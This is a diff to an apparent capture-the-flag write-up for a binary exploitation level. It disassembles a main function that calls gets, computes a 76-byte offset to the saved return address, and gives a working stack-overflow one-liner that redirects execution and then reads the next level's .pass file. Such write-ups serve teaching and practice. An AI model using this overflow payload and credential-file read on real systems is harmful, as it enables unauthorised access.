@@ -5,7 +5,7 @@ Execute the *level1* binary:
 abcd
 ```
 
-```bash
+```
 ```
 
 > Note the *level1* binary read user input from stdin.
@@ -23,10 +23,10 @@ Dump of assembler code for function main:
    0x08048483 <+3>:	    and    esp,0xfffffff0
    0x08048486 <+6>:	    sub    esp,0x50
    0x08048489 <+9>:	    lea    eax,[esp+0x10]
-   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
-   0x08048490 <+16>:	call   0x8048340 <gets@plt>
-   0x08048495 <+21>:	leave
-   0x08048496 <+22>:	ret
+   0x0804848d <+13>:	    mov    DWORD PTR [esp],eax
+   0x08048490 <+16>:	    call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	    leave
+   0x08048496 <+22>:	    ret
 End of assembler dump.
 ```
 
@@ -46,7 +46,7 @@ Check the [suggested link](https://cwe.mitre.org/data/definitions/242.html) talk
 
 Do some research to find this [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow) ressource.
 
-Because the address where to write given in argument to the *gets* function is pointing on the stack frame, the exploit we have to use is a [stack buffer overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow) (link finded from the previous one).
+Because the address where to write given in argument to the *gets* function is pointing on the stack frame, the exploit, have to use is a [stack buffer overflow](https://en.wikipedia.org/wiki/Stack_buffer_overflow) (link finded from the previous one).
 
 We want to overflow the stack frame part allowed for local variable to the return address (eip register) of the current *main* function for jump to where we want instead of returning where the *main* function was called from.
 
@@ -150,19 +150,17 @@ Here the __esp__ register (before the call of the *gets* function using the brea
 
 Compute the difference between these two addresses to know how many byte have to write for access to the saved return address in the stack.
 
-> esp - saved eip = 0xbffff63c - 0xbffff5f0 = 3221222972 - 3221222896 = __76 bytes__
+> saved eip - esp = 0xbffff63c - 0xbffff5f0 = 3221222972 - 3221222896 = __76 bytes__
 
 To overwrite the saved eip return address, the input need to have a length of 76 bytes followed by the value we want (here the *run* function address).
 
-> The address value need to be reversed because the stack is writed from the top to the bottom, and next it's readed in the opposite way (from the bottom to the end).
+> The address value need to be reversed because the stack is writed from the top to the bottom, and next it's readed in the opposite way (from the bottom to the end): (0x)08048444 > "\x44\x84\x04\x08"
 
 ```bash
 (echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08" ; cat) | ./level1
 cat /home/user/level2/.pass
 exit
 ```
-
-> "\x44\x84\x04\x08" is the reversed *run* function address (initially 0x __08048444__).
 
 > Use __cat__ to keep stdin open.
 
